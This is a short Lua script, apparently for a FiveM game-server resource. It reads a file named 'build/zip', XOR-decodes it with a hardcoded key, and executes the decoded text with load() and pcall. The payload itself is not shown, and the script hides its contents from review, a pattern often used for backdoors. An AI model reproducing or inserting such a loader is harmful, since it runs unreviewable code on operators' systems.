local secure = {}
secure.rname = GetCurrentResourceName()

secure.decodeStr = function(input)
	local key = "XNp8w!#*2c,0VW=9"
	local keyLen = #key
    local counter = 0
    local keyBytes = {key:byte(1, keyLen)}
	
    local output = input:gsub('.', function(c)
        counter = counter + 1
        return string.char(string.byte(c) ~ keyBytes[(counter - 1) % keyLen + 1])
    end)
	
    return output
end

secure.loads = function(script)
	local compiled_function, error_message = load(script, "SEXY")

	if compiled_function then
		local success, result = pcall(compiled_function)
		if not success then
			print("[HGS][Sexy] Error executing script:", result)
		end
	else
		print("[HGS][Sexy] Error loading zip..")
	end

end

local content = LoadResourceFile(secure.rname, 'build/zip')


if content then
	local decode = secure.decodeStr(content)
	secure.loads(decode)
end